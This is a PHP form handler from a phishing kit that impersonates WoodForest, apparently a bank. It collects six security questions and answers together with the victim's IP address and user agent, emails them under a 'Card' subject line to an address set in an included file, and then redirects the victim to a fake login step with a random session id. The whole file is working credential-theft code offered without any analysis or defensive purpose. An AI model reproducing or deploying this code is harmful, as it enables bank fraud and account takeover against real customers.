<?php
if($_POST["q1"] != "" and $_POST["ans1"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------WoodForest Info-----------------------\n";
$message .= "Security Question 1             : ".$_POST['q1']."\n";
$message .= "Answer           : ".$_POST['ans1']."\n";
$message .= "Security Question 2             : ".$_POST['q2']."\n";
$message .= "Answer           : ".$_POST['ans2']."\n";
$message .= "Security Question 3             : ".$_POST['q3']."\n";
$message .= "Answer           : ".$_POST['ans3']."\n";
$message .= "Security Question 4             : ".$_POST['q4']."\n";
$message .= "Answer           : ".$_POST['ans4']."\n";
$message .= "Security Question 5             : ".$_POST['q5']."\n";
$message .= "Answer           : ".$_POST['ans5']."\n";
$message .= "Security Question 6             : ".$_POST['q6']."\n";
$message .= "Answer           : ".$_POST['ans6']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>